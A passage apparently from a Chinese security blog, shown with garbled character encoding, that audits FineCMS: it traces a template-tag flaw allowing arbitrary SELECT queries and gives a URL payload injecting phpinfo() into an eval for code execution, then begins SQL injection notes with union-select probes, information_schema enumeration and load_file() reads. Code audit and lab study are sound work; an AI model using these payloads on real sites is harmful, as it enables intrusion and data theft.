<p>â€‹    <code>/finecms/dayrui/libraries/Template.php</code>ç¬¬434è¡Œ<code>$params = explode(&#39; &#39;, $_params);</code>å°†ä¼ å…¥çš„paramä»¥æ•°ç»„èµ‹å€¼ç»™$paramsã€‚</p>
<pre><code>Array()&#123;
  [0] =&gt; action=sql,
  [1] =&gt; sql=&#39;select user();&#39;
&#125;</code></pre>
<p>â€‹    ç¬¬436è¡Œå¼€å§‹éå†<code>$params</code>å¹¶èµ‹å€¼<code>$system[&#39;action&#39;]=sql</code>&amp;<code>$param[&#39;aql&#39;]=</code>â€˜select user();â€™.</p>
<pre><code class="php">437    $var = substr($t, 0, strpos($t, &#39;=&#39;));
438    $val = substr($t, strpos($t, &#39;=&#39;) + 1);

446    if (isset($system[$var])) &#123; // ç³»ç»Ÿå‚æ•°ï¼Œåªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œä¸èƒ½æ·»åŠ ä¿®é¥°ç¬¦
447    $system[$var] = $val;
448    &#125;

467    $param[$var] = $val;</code></pre>
<p>â€‹    é€šè¿‡switch caseåŒ¹é…æ‰§è¡ŒæŸ¥è¯¢ä»£ç ã€‚</p>
<pre><code class="php">      switch ($system[&#39;action&#39;]) &#123;
            Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
              Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
                  Â·Â·Â·Â·Â·Â·Â·Â·Â·
        case &#39;sql&#39;: // ç›´æ¥sqlæŸ¥è¯¢

                if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql)) &#123;


                    // æ•°æ®æºçš„é€‰æ‹©
                    $db = $this-&gt;ci-&gt;db;

                    // æ›¿æ¢å‰ç¼€
                    $sql = str_replace(
                        array(&#39;@#S&#39;, &#39;@#&#39;),
                        array($db-&gt;dbprefix.$system[&#39;site&#39;], $db-&gt;dbprefix),
                        trim(urldecode($sql[1]))
                    );
                    if (stripos($sql, &#39;SELECT&#39;) !== 0) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &#39;SQLè¯­å¥åªèƒ½æ˜¯SELECTæŸ¥è¯¢è¯­å¥&#39;);
                    &#125;

                    $total = 0;
                    $pages = &#39;&#39;;

                    // å¦‚å­˜åœ¨åˆ†é¡µæ¡ä»¶æ‰è¿›è¡Œåˆ†é¡µæŸ¥è¯¢
                    if ($system[&#39;page&#39;] &amp;&amp; $system[&#39;urlrule&#39;]) &#123;
                        $page = max(1, (int)$_GET[&#39;page&#39;]);
                        $row = $this-&gt;_query(preg_replace(&#39;/select \* from/iUs&#39;, &#39;SELECT count(*) as c FROM&#39;, $sql), $system[&#39;site&#39;], $system[&#39;cache&#39;], FALSE);
                        $total = (int)$row[&#39;c&#39;];
                        $pagesize = $system[&#39;pagesize&#39;] ? $system[&#39;pagesize&#39;] : 10;
                        // æ²¡æœ‰æ•°æ®æ—¶è¿”å›ç©º
                        if (!$total) &#123;
                            return $this-&gt;_return($system[&#39;return&#39;], &#39;æ²¡æœ‰æŸ¥è¯¢åˆ°å†…å®¹&#39;, $sql, 0);
                        &#125;
                        $sql.= &#39; LIMIT &#39;.$pagesize * ($page - 1).&#39;,&#39;.$pagesize;
                        $pages = $this-&gt;_get_pagination(str_replace(&#39;[page]&#39;, &#39;&#123;page&#125;&#39;, urldecode($system[&#39;urlrule&#39;])), $pagesize, $total);
                    &#125;

                    $data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);
                    $fields = NULL;

                    if ($system[&#39;module&#39;]) &#123;
                        $fields = $this-&gt;ci-&gt;module[$system[&#39;module&#39;]][&#39;field&#39;]; // æ¨¡å‹ä¸»è¡¨çš„å­—æ®µ
                    &#125;

                    if ($fields) &#123;
                        // ç¼“å­˜æŸ¥è¯¢ç»“æœ
                        $name = &#39;list-action-sql-&#39;.md5($sql);
                        $cache = $this-&gt;ci-&gt;get_cache_data($name);
                        if (!$cache &amp;&amp; is_array($data)) &#123;
                            // æ¨¡å‹è¡¨çš„ç³»ç»Ÿå­—æ®µ
                            $fields[&#39;inputtime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            $fields[&#39;updatetime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            // æ ¼å¼åŒ–æ˜¾ç¤ºè‡ªå®šä¹‰å­—æ®µå†…å®¹
                            foreach ($data as $i =&gt; $t) &#123;
                                $data[$i] = $this-&gt;ci-&gt;field_format_value($fields, $t, 1);
                            &#125;
                            //$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
                            $cache = $system[&#39;cache&#39;] ? $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]) : $data;
                        &#125;
                        $data = $cache;
                    &#125;
                    return $this-&gt;_return($system[&#39;return&#39;], $data, $sql, $total, $pages, $pagesize);
                &#125; else &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;å‚æ•°ä¸æ­£ç¡®ï¼ŒSQLè¯­å¥å¿…é¡»ç”¨å•å¼•å·åŒ…èµ·æ¥&#39;); // æ²¡æœ‰æŸ¥è¯¢åˆ°å†…å®¹
                &#125;
                break;

            case &#39;table&#39;: // è¡¨åæŸ¥è¯¢

                if (!$system[&#39;table&#39;]) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;tableå‚æ•°ä¸å­˜åœ¨&#39;);
                &#125;

                // é»˜è®¤ç«™ç‚¹å‚æ•°
                $system[&#39;site&#39;] = !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;];

                $tableinfo = $this-&gt;ci-&gt;get_cache(&#39;table&#39;);
                if (!$tableinfo) &#123;
                    $this-&gt;ci-&gt;load-&gt;model(&#39;system_model&#39;);
                    $tableinfo = $this-&gt;ci-&gt;system_model-&gt;cache(); // è¡¨ç»“æ„ç¼“å­˜
                &#125;
                if (!$tableinfo) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;è¡¨ç»“æ„ç¼“å­˜ä¸å­˜åœ¨ï¼ˆåå°èœå•-æ›´æ–°è¡¨ç»“æ„ï¼‰&#39;); // æ²¡æœ‰è¡¨ç»“æ„ç¼“å­˜æ—¶è¿”å›ç©º
                &#125;

                $table = $this-&gt;ci-&gt;db-&gt;dbprefix($system[&#39;table&#39;]); // ä¸»è¡¨
                if (!isset($tableinfo[$table][&#39;field&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;è¡¨ï¼ˆ&#39;.$table.&#39;ï¼‰ç»“æ„ç¼“å­˜ä¸å­˜åœ¨ï¼ˆåå°èœå•-æ›´æ–°è¡¨ç»“æ„ï¼‰&#39;);
                &#125;

                $where = $this-&gt;_set_where_field_prefix($where, $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ¡ä»¶å­—æ®µåŠ ä¸Šè¡¨å‰ç¼€
                $system[&#39;field&#39;] = $this-&gt;_set_select_field_prefix($system[&#39;field&#39;], $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ˜¾ç¤ºå­—æ®µåŠ ä¸Šè¡¨å‰ç¼€
                $system[&#39;order&#39;] = $this-&gt;_set_order_field_prefix($system[&#39;order&#39;], $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ’åºå­—æ®µåŠ ä¸Šè¡¨å‰ç¼€

                $total = 0;
                $sql_from = $table; // sqlçš„fromå­å¥</code></pre>
<p>â€‹    <code>  if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql))</code></p>
<p>â€‹    æ­£åˆ™åªæ˜¯å°†sql=å‚æ•°ä¸­çš„å†…å®¹åŒ¹é…å‡ºæ¥ä½œä¸ºsqlæŸ¥è¯¢å†…å®¹ï¼Œæ²¡æœ‰å¯¹æŸ¥è¯¢è¿›è¡Œé™åˆ¶ã€‚</p>
<p>â€‹    ä¼ å…¥766è¡Œçš„_queryå‡½æ•°è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<p><code>$data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);</code></p>
<p>â€‹    _queryå‡½æ•°ä½äº<code>/finecms/dayrui/libraries/Template.php</code>ç¬¬1318è¡Œã€‚</p>
<pre><code class="php">public function _query($sql, $site, $cache, $all = TRUE) &#123;

        // æ•°æ®åº“å¯¹è±¡
        $db = $site ? $this-&gt;ci-&gt;site[$site] : $this-&gt;ci-&gt;db;
        $cname = md5($sql.dr_now_url());
        // ç¼“å­˜å­˜åœ¨æ—¶è¯»å–ç¼“å­˜æ–‡ä»¶
        if ($cache &amp;&amp; $data = $this-&gt;ci-&gt;get_cache_data($cname)) &#123;
            return $data;
        &#125;

        // æ‰§è¡ŒSQL
        $db-&gt;db_debug = FALSE;
        $query = $db-&gt;query($sql);

        if (!$query) &#123;
            return &#39;SQLæŸ¥è¯¢è§£æä¸æ­£ç¡®ï¼š&#39;.$sql;
        &#125;

        // æŸ¥è¯¢ç»“æœ
        $data = $all ? $query-&gt;result_array() : $query-&gt;row_array();

        // å¼€å¯ç¼“å­˜æ—¶ï¼Œé‡æ–°å­˜å‚¨ç¼“å­˜æ•°æ®
        $cache &amp;&amp; $this-&gt;ci-&gt;set_cache_data($cname, $data, $cache);

        $db-&gt;db_debug = TRUE;

        return $data;
    &#125;</code></pre>
<p>â€‹    <code>$query = $db-&gt;query($sql);</code>æ‰§è¡Œsqlè¯­å¥ã€‚</p>
<p>â€‹    å°±å¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥äº†(select)ã€‚</p>
<h1 id="0X03-ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#0X03-ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="0X03 ä»»æ„ä»£ç æ‰§è¡Œ"></a>0X03 ä»»æ„ä»£ç æ‰§è¡Œ</h1><p>###æ¼æ´å®ç°</p>
<p>â€‹    payload:</p>
<pre><code class="html">/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=cache%20name=MEMBER.1&#39;];phpinfo();$a=[&#39;1</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/235415606.png" alt="mark"></p>
<p>authçš„å€¼ä¸ºæ­¤cookienameéƒ¨åˆ†å€¼çš„md5å€¼ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/235609912.png" alt="mark"></p>
<p><code>24b16fede9a67c9251d3e7c7161c83ac</code>    md5=&gt;    <code>50ce0d2401ce4802751739552c8e4467</code></p>
<h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>â€‹    å’Œä¸Šé¢çš„sqlè¯­å¥æ‰§è¡Œç±»ä¼¼ï¼Œå…ˆé€šè¿‡cookieè·å–åˆ°SYS_KEYï¼Œæ‰§è¡Œlist_tagå‡½æ•°ã€‚</p>
<p>â€‹    è·Ÿè¿›åˆ°list_tagå‡½æ•°ã€‚ç¬¬487-518è¡Œä»£ç ï¼š</p>
<pre><code class="php">switch ($system[&#39;action&#39;]) &#123;

            case &#39;cache&#39;: // ç³»ç»Ÿç¼“å­˜æ•°æ®

                if (!isset($param[&#39;name&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;nameå‚æ•°ä¸å­˜åœ¨&#39;);
                &#125;

                $pos = strpos($param[&#39;name&#39;], &#39;.&#39;);
                if ($pos !== FALSE) &#123;
                    $_name = substr($param[&#39;name&#39;], 0, $pos);
                    $_param = substr($param[&#39;name&#39;], $pos + 1);
                &#125; else &#123;
                    $_name = $param[&#39;name&#39;];
                    $_param = NULL;
                &#125;

                $cache = $this-&gt;_cache_var($_name, !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;]);
                if (!$cache) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &quot;ç¼“å­˜(&#123;$_name&#125;)ä¸å­˜åœ¨ï¼Œè¯·åœ¨åå°æ›´æ–°ç¼“å­˜&quot;);
                &#125;

                if ($_param) &#123;
                    $data = array();
                    @eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);
                    if (!$data) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &quot;ç¼“å­˜(&#123;$_name&#125;)å‚æ•°ä¸å­˜åœ¨!!&quot;);
                    &#125;
                &#125; else &#123;
                    $data = $cache;
                &#125;

                return $this-&gt;_return($system[&#39;return&#39;], $data, &#39;&#39;);
                break;</code></pre>
<p>â€‹    åŒ¹é…åˆ°cacheï¼Œæ‰§è¡Œå¯¹åº”ä»£ç ã€‚è¿™é‡Œä¼šæ ¹æ®<code>.</code>å°†nameå‚æ•°çš„å†…å®¹è¿›è¡Œåˆ†å‰²ï¼Œå‰éƒ¨åˆ†èµ‹ç»™<code>$_name</code>,åéƒ¨åˆ†èµ‹ç»™<code>$_param</code>.æ­¤æ—¶<code>$_param=1&#39;];phpinfo();$a=[&#39;1</code>.</p>
<p>â€‹    ç»§ç»­æ‰§è¡Œ<code>$cache = $this-&gt;_cache_var($_name, !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;]);</code></p>
<p>â€‹    å› ä¸ºä¸‹é¢ä¼šå¯¹$cacheæ˜¯å¦ä¸ºç©ºè¿›è¡Œåˆ¤æ–­:</p>
<pre><code class="php">if (!$cache) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &quot;ç¼“å­˜(&#123;$_name&#125;)ä¸å­˜åœ¨ï¼Œè¯·åœ¨åå°æ›´æ–°ç¼“å­˜&quot;);</code></pre>
<p>â€‹    æ‰€ä»¥è·³è½¬åˆ°_cache_varå‡½æ•°åˆ¤æ–­è¿”å›å€¼ã€‚(Template.php/1593-1620è¡Œ)</p>
<pre><code class="php"> public function _cache_var($name, $site = SITE_ID) &#123;

        $data = NULL;
        $name = strtoupper($name);

        switch ($name) &#123;
            case &#39;MEMBER&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;member&#39;);
                break;
            case &#39;URLRULE&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;urlrule&#39;);
                break;
            case &#39;MODULE&#39;:
                $data = $this-&gt;ci-&gt;get_cache(&#39;module&#39;);
                break;
            case &#39;CATEGORY&#39;:
                $site = $site ? $site : SITE_ID;
                $data = $this-&gt;ci-&gt;get_cache(&#39;category-&#39;.$site);
                break;
            default:
                $data = $this-&gt;ci-&gt;get_cache($name.&#39;-&#39;.$site);
                break;
        &#125;

        return $data;
    &#125;

&#125;</code></pre>
<p>â€‹    åªè¦è®©<code>list_tag</code>å‡½æ•°ä¸­èµ‹ç»™<code>$_name</code>çš„å€¼å¯ä»¥åœ¨<code>_cache_var</code>å‡½æ•°ä¸­åŒ¹é…åˆ°å°±å¯ä»¥ã€‚</p>
<p>â€‹    ç»§ç»­æ‰§è¡Œæ¥ä¸‹æ¥çš„å†…å®¹:</p>
<pre><code class="php">if ($_param) &#123;
                    $data = array();
                    @eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);
                    if (!$data) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &quot;ç¼“å­˜(&#123;$_name&#125;)å‚æ•°ä¸å­˜åœ¨!!&quot;);
                    &#125;
                &#125; else &#123;
                    $data = $cache;
                &#125;</code></pre>
<p>â€‹    <code>$_param</code>å‚æ•°ä¼šä¼ å…¥<code>_get_var</code>å‡½æ•°è¿›è¡ŒåŠ å·¥ã€‚</p>
<p>â€‹    _get_varå‡½æ•°å†…å®¹ã€‚(Template.php/1569-1590è¡Œ)</p>
<pre><code class="php">    public function _get_var($param) &#123;

        $array = explode(&#39;.&#39;, $param);
        if (!$array) &#123;
            return &#39;&#39;;
        &#125;

        $string = &#39;&#39;;
        foreach ($array as $var) &#123;
            $string.= &#39;[&#39;;
            if (strpos($var, &#39;$&#39;) === 0) &#123;
                $string.= preg_replace(&#39;/\[(.+)\]/U&#39;, &#39;[\&#39;\\1\&#39;]&#39;, $var);
            &#125; elseif (preg_match(&#39;/[A-Z_]+/&#39;, $var)) &#123;
                $string.= &#39;&#39;.$var.&#39;&#39;;
            &#125; else &#123;
                $string.= &#39;\&#39;&#39;.$var.&#39;\&#39;&#39;;
            &#125;
            $string.= &#39;]&#39;;
        &#125;

        return $string;
    &#125;</code></pre>
<p>â€‹    returnçš„<code>$string</code>ä¸º<code>[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;]</code>ã€‚</p>
<p>â€‹    ç„¶åå°†è¿”å›å€¼æ‹¼æ¥è¿›evalè¯­å¥è¿›è¡Œæ‰§è¡Œï¼Œçœ‹ä¸€ä¸‹æ‹¼æ¥åçš„è¯­å¥:<code>@eval($data=$cache[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;];);</code>.é¡ºåˆ©æ‰§è¡Œè¯­å¥ã€‚</p>
<p>â€‹    å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p>
<h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æ›´æ”¹cookienameçš„è®¾ç½®</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]    = md5(substr($site[&#39;SYS_KEY&#39;],0, 5)).&#39;_ci_session&#39;;</code></pre>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqliç¬”è®°</title>
    <url>/2020/01/10/sqli-bi-ji/</url>
    <content><![CDATA[<blockquote>
<p>åˆšåˆ·ä¸€ésqli-labsï¼Œè€Œä¸”å‘ç°ä¹‹å‰åˆ·sqli-labsçš„ç¬”è®°æ‰¾ä¸åˆ°äº†ï¼Œé‚£å°±è¿™æ¬¡é¡ºä¾¿åšä¸ªæ¯”è¾ƒå…¨é¢çš„æ•´ç†ï¼ŒåŒ…æ‹¬åŸºç¡€çŸ¥è¯†å’Œä¸€äº›é«˜çº§æŠ€å·§ï¼ŒåŒ…æ‹¬mysqlã€oracleå’Œsqlserverã€‚ã€oracleå’Œsqlserveræ›´æ–°ä¸­ã€‘</p>
</blockquote>
<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><h4 id="1ã€å˜é‡å’ŒåŸºç¡€ä¿¡æ¯"><a href="#1ã€å˜é‡å’ŒåŸºç¡€ä¿¡æ¯" class="headerlink" title="1ã€å˜é‡å’ŒåŸºç¡€ä¿¡æ¯"></a>1ã€å˜é‡å’ŒåŸºç¡€ä¿¡æ¯</h4><ul>
<li><p>å½“å‰æ•°æ®åº“ç‰ˆæœ¬</p>
<pre><code>VERSION()
@@VERSION
@@GLOBAL.VERSION</code></pre>
</li>
<li><p>å½“å‰ç”¨æˆ·</p>
<pre><code>USER()
SYSTEM_USER()
SESSION_USER()
CURRENT_USER()</code></pre>
</li>
<li><p>å½“å‰æ•°æ®åº“</p>
<pre><code>DATABASE()
SCHEMA()</code></pre>
</li>
<li><p>è·¯å¾„</p>
<pre><code>@@BASEDIR : mysqlå®‰è£…è·¯å¾„ï¼š
@@SLAVE_LOAD_TMPDIR : ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„ï¼š
@@DATADIR : æ•°æ®å­˜å‚¨è·¯å¾„ï¼š
@@CHARACTER_SETS_DIR : å­—ç¬¦é›†è®¾ç½®æ–‡ä»¶è·¯å¾„
@@LOG_ERROR : é”™è¯¯æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š
@@PID_FILE : pid-fileæ–‡ä»¶è·¯å¾„
@@BASEDIR : mysqlå®‰è£…è·¯å¾„ï¼š
@@SLAVE_LOAD_TMPDIR : ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„</code></pre>
</li>
</ul>
<h4 id="2ã€å¸¸ç”¨å‡½æ•°"><a href="#2ã€å¸¸ç”¨å‡½æ•°" class="headerlink" title="2ã€å¸¸ç”¨å‡½æ•°"></a>2ã€å¸¸ç”¨å‡½æ•°</h4><h5 id="è”åˆå‡½æ•°"><a href="#è”åˆå‡½æ•°" class="headerlink" title="è”åˆå‡½æ•°"></a>è”åˆå‡½æ•°</h5><pre><code>CONCAT()
GROUP_CONCAT()
CONCAT_WS()</code></pre>
<h5 id="æ•°å­—-å­—ç¬¦-å­—ç¬¦ä¸²"><a href="#æ•°å­—-å­—ç¬¦-å­—ç¬¦ä¸²" class="headerlink" title="æ•°å­—/å­—ç¬¦/å­—ç¬¦ä¸²"></a>æ•°å­—/å­—ç¬¦/å­—ç¬¦ä¸²</h5><pre><code>ASCII(): è·å–å­—æ¯çš„asciiç å€¼
BIN(): è¿”å›å€¼çš„äºŒè¿›åˆ¶ä¸²è¡¨ç¤º
CONV(): è¿›åˆ¶è½¬æ¢
FLOOR()ï¼šå‘ä¸‹å–æ•´
ROUND()ï¼šèˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°
LOWER()ï¼šè½¬æˆå°å†™å­—æ¯
UPPER(): è½¬æˆå¤§å†™å­—æ¯
HEX():åå…­è¿›åˆ¶ç¼–ç 
UNHEX()ï¼šåå…­è¿›åˆ¶è§£ç 

MID()ï¼šä»æ–‡æœ¬å­—æ®µä¸­æå–å­—ç¬¦
LEFT()ï¼šä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²
SUBSTR()ï¼šæˆªå–å­—ç¬¦ä¸²
SUBSTRING()ï¼šæˆªå–å­—ç¬¦ä¸²</code></pre>
<h5 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h5><pre><code>è¡Œé—´æ³¨é‡Š
xxx-- -(--åé¢æœ‰ä¸ªç©ºæ ¼)
xxx;--
xxx#
xxx;#
` (åå¼•å·)

è¡Œå†…æ³¨é‡Š
/* */
+xx/* å†…å®¹ */xx;
/*! è¯­å¥ */
/*! select * from test */
è¯­å¥ä¼šè¢«æ‰§è¡Œ</code></pre>
<h3 id="æ³¨å…¥åŸºç¡€"><a href="#æ³¨å…¥åŸºç¡€" class="headerlink" title="æ³¨å…¥åŸºç¡€"></a>æ³¨å…¥åŸºç¡€</h3><h4 id="1ã€åˆ¤æ–­æ³¨å…¥å­˜åœ¨"><a href="#1ã€åˆ¤æ–­æ³¨å…¥å­˜åœ¨" class="headerlink" title="1ã€åˆ¤æ–­æ³¨å…¥å­˜åœ¨"></a>1ã€åˆ¤æ–­æ³¨å…¥å­˜åœ¨</h4><ul>
<li><p>æ•°å­—å‹</p>
<pre><code>?id=1+1#
?id=-1 or 1=1#
?id=-1 or 10-2=8#
?id=1 and 1=2#
?id=1 and 1=1#</code></pre>
</li>
<li><p>å­—ç¬¦å‹</p>
<p>å‚æ•°è¢«å¼•å·æˆ–æ‹¬å·åŒ…å›´ï¼Œæˆ‘ä»¬éœ€è¦é—­åˆå¼•å·æˆ–æ‹¬å·ã€‚</p>
<pre><code>?id=1&#39;#
?id=1&quot;#
?id=1&#39;)#
?id=1)#
?id=1&#39; and &#39;1&#39;=&#39;1#
?id=1&#39; and &#39;1&#39;=&#39;2#</code></pre>
</li>
</ul>
<h4 id="2ã€order-by"><a href="#2ã€order-by" class="headerlink" title="2ã€order by"></a>2ã€order by</h4><p>ORDER BY å…³é”®è¯ç”¨äºå¯¹è®°å½•é›†ä¸­çš„æ•°æ®è¿›è¡Œæ’åºã€‚</p>
<p>åœ¨å­˜åœ¨æ³¨å…¥çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>order by</code>å­å¥è¿›è¡Œå¿«é€ŸçŒœè§£åˆ—æ•°ï¼Œå†é…åˆ<code>union select</code>è¯­å¥è¿›è¡Œå›æ˜¾ã€‚</p>
<pre><code>?id=1&#39; order by 3#(æ­£ç¡®)
?id=1&#39; order by 4#(é”™è¯¯)
åˆ—æ•°ä¸º3</code></pre>
<p>å½“ç„¶é€šè¿‡<code>order by</code>åˆ¤æ–­å‡ºæ¥çš„åˆ—æ•°ä¸ä¸€å®šå°±æ˜¯è¯¥è¡¨ä¸­çš„å…¨éƒ¨åˆ—æ•°ï¼Œè€Œæ˜¯è¯¥sqlè¯­å¥æŸ¥è¯¢çš„åˆ—ä¸ªæ•°ï¼Œå¦‚æœä½¿ç”¨çš„<code>select * from xx</code>æŸ¥è¯¢çš„è¯å°±å¯ä»¥é€šè¿‡<code>order by</code>å¾—çŸ¥è¡¨çš„åˆ—æ•°ã€‚</p>
<h4 id="3ã€unionæŸ¥è¯¢"><a href="#3ã€unionæŸ¥è¯¢" class="headerlink" title="3ã€unionæŸ¥è¯¢"></a>3ã€unionæŸ¥è¯¢</h4><p>MySQL UNION æ“ä½œç¬¦ç”¨äºè¿æ¥ä¸¤ä¸ªä»¥ä¸Šçš„ SELECT è¯­å¥çš„ç»“æœç»„åˆåˆ°ä¸€ä¸ªç»“æœé›†åˆä¸­ã€‚</p>
<p>é€šè¿‡unionæ“ä½œç¬¦æˆ‘ä»¬å¯ä»¥åœ¨é—­åˆå½“å‰æŸ¥è¯¢è¯­å¥åæ‹¼æ¥ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æŸ¥è¯¢è¯­å¥æ¥æŸ¥è¯¢å¹¶å¸¦å‡ºæ•°æ®ã€‚</p>
<pre><code class="mysql">mysql&gt; select * from users where id=&#39;1&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from users where id=&#39;1&#39; union select 1,&#39;aa&#39;,&#39;lanvnal&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | aa       | lanvnal  |
+----+----------+----------+
2 rows in set (0.00 sec)</code></pre>
<p>é€šå¸¸é¡µé¢åªä¼šæ˜¾ç¤ºæŸ¥è¯¢çš„ç¬¬ä¸€ä¸ªç»“æœï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶æŸ¥è¯¢æ¡ä»¶ä½¿åŸæŸ¥è¯¢çš„ç»“æœä¸ºç©ºã€‚</p>
<h4 id="4ã€limitç”¨æ³•"><a href="#4ã€limitç”¨æ³•" class="headerlink" title="4ã€limitç”¨æ³•"></a>4ã€limitç”¨æ³•</h4><pre><code>SELECT * FROM ids LIMIT a,b</code></pre>
<p>LIMITåçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¾“å‡ºè®°å½•çš„åˆå§‹ä½ç½®ï¼Œç¬¬äºŒä¸ªå‚æ•°åç§»é‡ï¼Œåç§»å¤šå°‘ï¼Œè¾“å‡ºçš„æ¡ç›®å°±æ˜¯å¤šå°‘ã€‚</p>
<pre><code>SELECT * FROM ids LIMIT 10 OFFSET 2</code></pre>
<p>OFFSETä¸é€—å·éš”å¼€åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå”¯ä¸€çš„å·®åˆ«å°±æ˜¯ä¸¤ä¸ªå‚æ•°çš„ä½ç½®å‰åé¢ å€’äº†ä¸€ä¸‹ã€‚</p>
<h4 id="5ã€æŸ¥åº“-è¡¨-åˆ—å"><a href="#5ã€æŸ¥åº“-è¡¨-åˆ—å" class="headerlink" title="5ã€æŸ¥åº“/è¡¨/åˆ—å"></a>5ã€æŸ¥åº“/è¡¨/åˆ—å</h4><pre><code>æŸ¥æ•°æ®åº“åï¼šselect database() 
æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼š select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA
æŸ¥è¯¢æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨ï¼šselect group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479
æŸ¥usersè¡¨åä¸‹çš„åˆ—åä¿¡æ¯ï¼šunion select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x75736572
æŸ¥usersè¡¨åä¸‹åˆ—åusername,passwordçš„æ•°æ®ï¼š
union select 1,username,password from user
union select 1,group_concat(username,password),3 from users

===============
information_schema.tablesï¼šå­˜å‚¨mysqlæ•°æ®åº“ä¸‹é¢çš„æ‰€æœ‰è¡¨åä¿¡æ¯çš„è¡¨
information_schema.columns ï¼šå­˜å‚¨mysqlæ•°æ®åº“ä¸‹é¢çš„æ‰€æœ‰åˆ—åä¿¡æ¯çš„è¡¨
table_schemaï¼šæ•°æ®åº“å
Table_nameï¼šè¡¨å
column_nameï¼šåˆ—å</code></pre>
<h4 id="6ã€æ–‡ä»¶æ“ä½œ"><a href="#6ã€æ–‡ä»¶æ“ä½œ" class="headerlink" title="6ã€æ–‡ä»¶æ“ä½œ"></a>6ã€æ–‡ä»¶æ“ä½œ</h4><blockquote>
<p>æ¡ä»¶ï¼š</p>
<p>éœ€è¦æœ‰è¯»å–æ–‡ä»¶çš„æƒé™</p>
<p>éœ€è¦çŸ¥é“ç»å¯¹ç‰©ç†è·¯å¾„</p>
<p>æ–‡ä»¶å¤§å°å°äºmax_allowed_packet</p>
</blockquote>
<p>load_file()</p>
<pre><code>load_file(&quot;/tmp/test.txtâ€)
load_file(char(68,58,92,116,101,115,116,46,116,120,116))
load_file(0x443A2F2F746573742E747874)</code></pre>
<p>å¯¼å‡ºæ•°æ®</p>
